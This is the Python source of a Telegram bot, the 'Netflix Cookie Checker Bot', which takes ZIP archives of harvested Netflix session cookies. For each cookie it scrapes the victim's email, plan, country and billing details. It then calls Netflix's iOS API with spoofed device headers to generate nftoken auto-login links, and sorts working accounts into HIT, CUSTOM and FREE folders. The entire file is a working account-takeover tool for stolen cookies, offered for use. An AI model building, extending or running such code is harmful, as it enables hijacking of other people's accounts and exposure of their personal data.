import os
import sys
import re
import json
import zipfile
import tempfile
import shutil
import requests
import urllib.parse
from datetime import datetime
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============ TELEGRAM IMPORTS ============
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
except Exception as e:
    print(f"❌ Telegram import error: {e}")
    sys.exit(1)

# ============ PORT FIX FOR RENDER ============
PORT = int(os.environ.get("PORT", 10000))
print(f"✅ Server will run on port {PORT} (for health checks)")

# ============ KEEP ALIVE SERVER FOR RENDER ============
try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import threading

    class KeepAliveHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
        def log_message(self, format, *args):
            pass

    def run_keep_alive():
        try:
            port = int(os.environ.get("PORT", 10000))
            server = HTTPServer(("0.0.0.0", port), KeepAliveHandler)
            server.serve_forever()
        except:
            pass

    keep_alive_thread = threading.Thread(target=run_keep_alive, daemon=True)
    keep_alive_thread.start()
    print("✅ Keep-alive server started")
except Exception as e:
    print(f"⚠️ Keep-alive server not started: {e}")

# ============ BOT CONFIGURATION ============
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN environment variable not set!")
    sys.exit(1)

MAX_FILE_SIZE = 5 * 1024 * 1024
MAX_WORKERS = 3  # 3 threads is the sweet spot for 512MB RAM
CHUNK_SIZE = 30
ZIP_THRESHOLD = 20

# ============ NETFLIX CONFIGURATION ============
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# ============ COUNTERS ============
class Counters:
    def __init__(self):
        self.hit = 0
        self.custom = 0
        self.free = 0
        self.bad = 0
        self.lock = Lock()

    def get_stats(self):
        with self.lock:
            return f"HIT: {self.hit} | CUSTOM: {self.custom} | FREE: {self.free} | BAD: {self.bad}"

    def add_hit(self):
        with self.lock:
            self.hit += 1

    def add_custom(self):
        with self.lock:
            self.custom += 1

    def add_free(self):
        with self.lock:
            self.free += 1

    def add_bad(self):
        with self.lock:
            self.bad += 1

    def reset(self):
        with self.lock:
            self.hit = 0
            self.custom = 0
            self.free = 0
            self.bad = 0

counters = Counters()

# ============ COOKIE FUNCTIONS ============
def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def fix_email_display(email):
    if not email or email == "Unknown":
        return email
    return email.replace('\\x40', '@').replace('%40', '@')

def extract_cookie_dict(text):
    cookie_dict = {}
    # 1. Netscape
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))
    # 2. JSON
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for cookie in data:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = decode_cookie_value(value)
        elif isinstance(data, dict):
            if any(key in data for key in COOKIE_KEYS):
                for key in COOKIE_KEYS:
                    value = data.get(key)
                    if isinstance(value, str):
                        cookie_dict[key] = decode_cookie_value(value)
            elif isinstance(data.get("cookies"), list):
                for cookie in data["cookies"]:
                    name = cookie.get("name")
                    value = cookie.get("value")
                    if name in COOKIE_KEYS and isinstance(value, str):
                        cookie_dict[name] = decode_cookie_value(value)
    except:
        pass
    # 3. Direct search
    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = decode_cookie_value(match.group(1))
    return cookie_dict

def extract_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return extract_cookie_dict(content)
    except Exception:
        return {}

def get_account_info(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None
    url = "https://www.netflix.com/account"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }
    cookies = {"NetflixId": netflix_id}
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10, verify=False)
        text = response.text
        info = {
            "status": "Unknown",
            "email": "Unknown",
            "country": "Unknown",
            "plan": "Unknown",
            "maxStreams": "Unknown",
            "memberSince": "Unknown",
            "nextBilling": "Unknown",
        }
        status_match = re.search(r'"membershipStatus":"(\w+)"', text)
        if status_match:
            status = status_match.group(1)
            if status == "CURRENT_MEMBER":
                info["status"] = "Active"
            elif status == "FORMER_MEMBER":
                info["status"] = "Canceled"
            elif status == "NEVER_MEMBER":
                info["status"] = "Free"
            else:
                info["status"] = status
        email_match = re.search(r'"profileEmailAddress":"([^"]+)"', text)
        if not email_match:
            email_match = re.search(r'"emailAddress":"([^"]+)"', text)
        if email_match:
            info["email"] = fix_email_display(email_match.group(1))
        country_match = re.search(r'"currentCountry":"([^"]+)"', text)
        if country_match:
            info["country"] = country_match.group(1)
        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
        if not plan_match:
            plan_match = re.search(r'"localizedPlanName":"([^"]+)"', text)
        if plan_match:
            info["plan"] = plan_match.group(1)
        streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)', text)
        if streams_match:
            info["maxStreams"] = streams_match.group(1)
        since_match = re.search(r'"memberSince":"([^"]+)"', text)
        if since_match:
            info["memberSince"] = since_match.group(1)
        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"', text)
        if billing_match:
            info["nextBilling"] = billing_match.group(1)
        return info
    except Exception:
        return None

def get_nftoken_from_cookies(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None, None
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=15, verify=False)
        response.raise_for_status()
        data = response.json()
        token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
        token = token_data.get("token")
        expires = token_data.get("expires")
        if not token:
            return None, None
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        return token, expires
    except Exception:
        return None, None

def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)

def classify_plan(plan_name):
    if not plan_name:
        return "Unknown"
    plan_lower = plan_name.lower()
    basic_keywords = ["basic", "dasar", "asas", "basis", "básico", "essentiel", "base"]
    standard_keywords = ["standard", "standar", "standart", "estándar", "padrão"]
    premium_keywords = ["premium", "prémium", "perhe"]
    for kw in basic_keywords:
        if kw in plan_lower:
            return "Basic"
    for kw in standard_keywords:
        if kw in plan_lower:
            return "Standard"
    for kw in premium_keywords:
        if kw in plan_lower:
            return "Premium"
    return plan_name

def is_valid_cookie(cookie_dict):
    return REQUIRED_COOKIE in cookie_dict

def process_single_cookie_file(file_path):
    try:
        cookie_dict = extract_cookies_from_file(file_path)
        if not is_valid_cookie(cookie_dict):
            return None
        account_info = get_account_info(cookie_dict)
        if not account_info or account_info["status"] == "Unknown":
            return None
        account_info["email"] = fix_email_display(account_info["email"])
        token, expires = get_nftoken_from_cookies(cookie_dict)
        if not token:
            return None
        time_left_str = "Unknown"
        if expires:
            try:
                expiry_dt = datetime.fromtimestamp(expires)
                time_now = datetime.now()
                time_left = expiry_dt - time_now
                if time_left.total_seconds() > 0:
                    days = time_left.days
                    hours = time_left.seconds // 3600
                    minutes = (time_left.seconds % 3600) // 60
                    time_left_str = f"{days}d {hours}h {minutes}m"
                else:
                    time_left_str = "EXPIRED"
            except:
                pass
        result = {
            "email": account_info["email"],
            "status": account_info["status"],
            "country": account_info["country"],
            "plan": account_info["plan"],
            "plan_type": classify_plan(account_info["plan"]),
            "maxStreams": account_info["maxStreams"],
            "memberSince": account_info["memberSince"],
            "nextBilling": account_info["nextBilling"],
            "nftoken": token,
            "expires": expires,
            "expiry_formatted": format_expiry(expires),
            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
            "time_left": time_left_str
        }
        return result
    except Exception as e:
        return None

# ============ FILE PROCESSING FUNCTIONS ============
def extract_zip(file_path, extract_path):
    try:
        with zipfile.ZipFile(file_path, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
        return True, None
    except zipfile.BadZipFile:
        return False, "Corrupted ZIP file"
    except Exception as e:
        return False, f"Extraction error: {str(e)}"

def find_txt_files(folder_path):
    txt_files = []
    try:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
    except Exception:
        pass
    return txt_files

def create_account_file(result, folder_path, filename):
    filepath = os.path.join(folder_path, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write("=" * 50 + "\n")
        f.write("NETFLIX ACCOUNT INFORMATION\n")
        f.write("=" * 50 + "\n\n")
        f.write(f"EMAIL: {result['email']}\n")
        f.write(f"STATUS: {result['status']}\n")
        f.write(f"COUNTRY: {result['country']}\n")
        f.write(f"PLAN: {result['plan']} ({result['plan_type']})\n")
        f.write(f"MAX STREAMS: {result['maxStreams']}\n")
        f.write(f"MEMBER SINCE: {result['memberSince']}\n")
        f.write(f"NEXT BILLING: {result['nextBilling']}\n")
        f.write(f"EXPIRES: {result['expiry_formatted']}\n")
        f.write(f"TIME LEFT: {result.get('time_left', 'Unknown')}\n")
        f.write("\n" + "-" * 50 + "\n")
        f.write("NFTOKEN LINKS:\n")
        f.write("-" * 50 + "\n")
        f.write(f"PC LINK: {result['pc_link']}\n")
        f.write(f"PHONE LINK: {result['phone_link']}\n")
        f.write("\n" + "=" * 50 + "\n")
        f.write(f"CHECKED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

def create_results_zip(results):
    try:
        temp_dir = tempfile.mkdtemp()
        hit_folder = os.path.join(temp_dir, "HIT")
        custom_folder = os.path.join(temp_dir, "CUSTOM")
        free_folder = os.path.join(temp_dir, "FREE")
        os.makedirs(hit_folder, exist_ok=True)
        os.makedirs(custom_folder, exist_ok=True)
        os.makedirs(free_folder, exist_ok=True)
        for result in results:
            email_safe = result['email'].replace('@', '_at_').replace('.', '_')
            filename = f"{email_safe}.txt"
            if result["status"] == "Active":
                create_account_file(result, hit_folder, filename)
            elif result["status"] == "Canceled":
                create_account_file(result, custom_folder, filename)
            elif result["status"] == "Free":
                create_account_file(result, free_folder, filename)
        zip_path = os.path.join(temp_dir, "netflix_results.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith('.txt'):
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_dir)
                        zipf.write(file_path, arcname)
        return zip_path
    except Exception as e:
        print(f"Error creating ZIP: {e}")
        return None

# ============ TELEGRAM HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📦 Send ZIP File", callback_data="send_file")],
        [InlineKeyboardButton("📖 How to Use", callback_data="help")],
        [InlineKeyboardButton("ℹ️ About Bot", callback_data="about")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"🎬 **Netflix Cookie Checker Bot**\n\n"
        f"Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
        f"⚡ **Processing {MAX_WORKERS} files in parallel**\n"
        f"⚠️ **Maximum file size: 5 MB**\n\n"
        f"📦 If results exceed {ZIP_THRESHOLD}, I'll send a ZIP file organized by status.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 **How to Use**\n\n"
        "1️⃣ Collect Netflix cookies in TXT files\n"
        "2️⃣ Put all files in one folder\n"
        "3️⃣ Compress folder as ZIP\n"
        "4️⃣ Send the ZIP file to the bot\n\n"
        "📂 **Required Cookie Format:**\n"
        "• Netscape format or JSON\n"
        "• Must contain: NetflixId\n\n"
        f"⚙️ **Processing:** {MAX_WORKERS} parallel threads\n"
        f"📦 **ZIP threshold:** {ZIP_THRESHOLD} accounts"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")

async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    about_text = (
        "ℹ️ **About Bot**\n\n"
        "Netflix Cookie Checker Bot\n"
        "Checks Netflix cookies and generates NFToken links.\n\n"
        f"🔹 Version: 7.0 (Final Stable)\n"
        f"🔹 Threads: {MAX_WORKERS}\n"
        f"🔹 ZIP threshold: {ZIP_THRESHOLD} accounts\n"
        "🔹 Organized folders: HIT, CUSTOM, FREE"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = f"📊 **Current Statistics**\n\n{counters.get_stats()}\n\n🔄 Use /resetstats to reset counters"
    keyboard = [
        [InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")],
        [InlineKeyboardButton("🔙 Back", callback_data="back")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")

async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    counters.reset()
    if update.callback_query:
        await update.callback_query.answer("📊 Statistics reset!", show_alert=True)
        await stats_command(update, context)
    else:
        await update.message.reply_text("📊 Statistics reset!")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "send_file":
        await query.edit_message_text("📤 **Send the ZIP file now**", parse_mode="Markdown")
    elif query.data == "help":
        await help_command(update, context)
    elif query.data == "about":
        await about_command(update, context)
    elif query.data == "stats":
        await stats_command(update, context)
    elif query.data == "reset_stats":
        await reset_stats_command(update, context)
    elif query.data == "back":
        keyboard = [
            [InlineKeyboardButton("📦 Send ZIP File", callback_data="send_file")],
            [InlineKeyboardButton("📖 How to Use", callback_data="help")],
            [InlineKeyboardButton("ℹ️ About Bot", callback_data="about")],
            [InlineKeyboardButton("📊 Stats", callback_data="stats")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"🎬 **Netflix Cookie Checker Bot**\n\n"
            f"Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
            f"⚡ **Processing {MAX_WORKERS} files in parallel**\n"
            f"⚠️ **Maximum file size: 5 MB**",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

async def send_account_message(update, context, result, index, total):
    status_emoji = "✅" if "Active" in result["status"] else "❌" if "Canceled" in result["status"] else "🆓"
    plan_emoji = "🟣" if result["plan_type"] == "Premium" else "🔵" if result["plan_type"] == "Standard" else "🟢" if result["plan_type"] == "Basic" else "⚪"
    message = (
        f"🎬 **Account #{index}/{total}**\n\n"
        f"📧 **Email:** `{result['email']}`\n"
        f"📊 **Status:** {status_emoji} {result['status']}\n"
        f"🌍 **Country:** {result['country']}\n"
        f"📦 **Plan:** {result['plan']} {plan_emoji} {result['plan_type']}\n"
        f"📺 **Max Streams:** {result['maxStreams']}\n"
        f"📅 **Member Since:** {result['memberSince']}\n"
        f"💳 **Next Billing:** {result['nextBilling']}\n"
        f"⏱️ **Expires:** {result['expiry_formatted']}\n"
        f"⏳ **Time Left:** {result.get('time_left', 'Unknown')}\n\n"
        "🔑 **NFToken Links:**"
    )
    keyboard = [
        [InlineKeyboardButton("💻 PC Link", url=result['pc_link'])],
        [InlineKeyboardButton("📱 Phone Link", url=result['phone_link'])],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="Markdown")

async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, extract_dir, status_msg):
    try:
        success, error_msg = extract_zip(file_path, extract_dir)
        if not success:
            await status_msg.edit_text(f"❌ Failed: {error_msg}", parse_mode="Markdown")
            return
        txt_files = find_txt_files(extract_dir)
        if not txt_files:
            await status_msg.edit_text("❌ No TXT files found!", parse_mode="Markdown")
            return
        total_files = len(txt_files)
        results = []
        processed = 0
        total_processed = 0
        status_lock = Lock()

        def update_status(completed):
            nonlocal total_processed
            with status_lock:
                total_processed += completed

        # Parallel processing function
        def process_batch(batch):
            batch_results = []
            for file_path in batch:
                try:
                    result = process_single_cookie_file(file_path)
                    if result:
                        batch_results.append(result)
                        if result["status"] == "Active":
                            counters.add_hit()
                        elif result["status"] == "Canceled":
                            counters.add_custom()
                        elif result["status"] == "Free":
                            counters.add_free()
                    else:
                        counters.add_bad()
                except Exception as e:
                    counters.add_bad()
            return batch_results

        # Process in batches
        for i in range(0, total_files, CHUNK_SIZE):
            batch = txt_files[i:i+CHUNK_SIZE]
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                future = executor.submit(process_batch, batch)
                try:
                    batch_results = future.result(timeout=60)
                    results.extend(batch_results)
                    processed += len(batch)
                    await status_msg.edit_text(
                        f"⏳ **Processing your file...**\n\n"
                        f"📁 {processed}/{total_files} files checked\n"
                        f"📊 {counters.get_stats()}",
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    print(f"Batch timeout/error: {e}")
                    continue

        await status_msg.delete()

        if not results:
            await update.message.reply_text(f"❌ No valid accounts!\n\n📊 {counters.get_stats()}", parse_mode="Markdown")
            return

        if len(results) > ZIP_THRESHOLD:
            zip_path = create_results_zip(results)
            if zip_path and os.path.exists(zip_path):
                with open(zip_path, 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename="netflix_results.zip",
                        caption=f"✅ **Scan Complete!**\n\n"
                                f"📊 Total: {len(results)}\n"
                                f"📁 Files: {total_files}\n\n"
                                f"📊 {counters.get_stats()}",
                        parse_mode="Markdown"
                    )
                try:
                    os.remove(zip_path)
                    shutil.rmtree(os.path.dirname(zip_path))
                except:
                    pass
            else:
                for i, result in enumerate(results, 1):
                    await send_account_message(update, context, result, i, len(results))
                await update.message.reply_text(f"✅ Done!\n\n📊 {counters.get_stats()}", parse_mode="Markdown")
        else:
            for i, result in enumerate(results, 1):
                await send_account_message(update, context, result, i, len(results))
            await update.message.reply_text(f"✅ Done!\n\n📊 {counters.get_stats()}", parse_mode="Markdown")

    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)}", parse_mode="Markdown")
    finally:
        try:
            shutil.rmtree(os.path.dirname(extract_dir))
        except:
            pass

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        document = update.message.document
        if document.file_size > MAX_FILE_SIZE:
            await update.message.reply_text(f"❌ File too large! Max 5 MB", parse_mode="Markdown")
            return
        file_name = document.file_name or ""
        if not file_name.lower().endswith('.zip'):
            await update.message.reply_text("❌ Only ZIP files supported!", parse_mode="Markdown")
            return
        status_msg = await update.message.reply_text(
            f"⏳ **Processing...**\n\n📊 {counters.get_stats()}",
            parse_mode="Markdown"
        )
        temp_dir = tempfile.mkdtemp()
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        file_path = os.path.join(temp_dir, file_name)
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        await process_zip_file(update, context, file_path, extract_dir, status_msg)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode="Markdown")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Error: {context.error}")

# ============ MAIN ============
def main():
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("about", about_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("resetstats", reset_stats_command))
        application.add_handler(CallbackQueryHandler(button_callback, pattern="^(send_file|help|about|back|stats|reset_stats)$"))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_error_handler(error_handler)
        print("🤖 Netflix Cookie Checker Bot is running...")
        print(f"✅ {MAX_WORKERS} parallel threads")
        print(f"📦 ZIP threshold: {ZIP_THRESHOLD}")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
